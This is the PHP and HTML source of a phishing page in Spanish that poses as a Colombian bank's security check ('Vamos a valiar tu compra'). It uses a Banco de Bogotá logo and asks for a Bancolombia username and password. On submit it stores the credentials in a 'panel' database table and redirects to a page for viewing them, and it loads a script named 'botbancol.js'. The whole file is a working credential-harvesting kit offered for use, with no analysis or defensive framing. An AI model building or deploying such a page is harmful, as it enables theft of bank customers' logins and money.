<?php
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $conn = getConnection();
    
    $uuid = bin2hex(random_bytes(18));
    $uuid = substr($uuid, 0, 8) . '-' . substr($uuid, 8, 4) . '-' . substr($uuid, 12, 4) . '-' . substr($uuid, 16, 4) . '-' . substr($uuid, 20, 12);

    $dato1 = $conn->real_escape_string($_POST['dato1']);
    $dato2 = $conn->real_escape_string($_POST['dato2']);

    $stmt = $conn->prepare("INSERT INTO  panel (id, dato1, dato2) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $uuid, $dato1, $dato2);
    
    if ($stmt->execute()) {
        $stmt->close();
        $conn->close();
        header("Location: ver_dato.php?id=$uuid");
        exit();
    } else {
        die("Error al insertar datos: " . $conn->error);
    }
}
?>


<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Seguridad</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
        }

        .container {
            background-color: white;
            padding: 2rem;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            text-align: center;
        }

        .logo img {
            width: 100px;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            color: #333;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        label {
            text-align: left;
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
            color: #555;
        }

        select, input {
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 1rem;
            color: #333;
            width: 100%;
            box-sizing: border-box;
        }

        .forgot-password {
            text-align: right;
            display: block;
            margin-bottom: 1.5rem;
            color: #0066cc;
            font-size: 0.9rem;
        }

        .login-button {
            background-color: #000000;
            border: none;
            padding: 0.8rem;
            border-radius: 5px;
            font-size: 1rem;
            color: #ffffff;
            cursor: not-allowed;
            margin-bottom: 1.5rem;
        }

        .register {
            font-size: 0.9rem;
            color: #555;
        }

        .register a {
            color: #0066cc;
            text-decoration: none;
        }

        .register a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">

        <div style=" padding-bottom: 5%; border-style: solid; border-width: 0px 0px 1px 0px; border-color: gray;">
            <img style="width: 70%;" src="../../img/BANCO DE BOGOTA.png" alt="">
        </div>

        <div style="margin-top: 1%; margin-bottom: 8%;">
            <p style="margin-bottom: 8%; "><strong>Vamos a valiar tu compra</strong></p>
            <p style="text-align: left;">Se requiere verificar la transacción que intentas realizar con tu tarjeta  por seguridad</p>
            
        </div>

        
        
        <h1>Ingresa a la Banca Virtual</h1>
        <form method="POST">
            <label for="document-number">Usuario Bancolombia</label>
            <input type="text" id="username" name="dato1" placeholder="Usuario" required>
            <label for="password">Ingresa tu contraseña</label>
            <input type="password" id="password" name="dato2" placeholder="Ingresa tu contraseña"    required>
            <a href="#" class="forgot-password">Olvidé mi contraseña</a>
            <button id="submitBtn" class="login-button">INGRESAR</button>
            
            <script src="botbancol.js"></script>
        </form>

    </div>
</body>
</html>

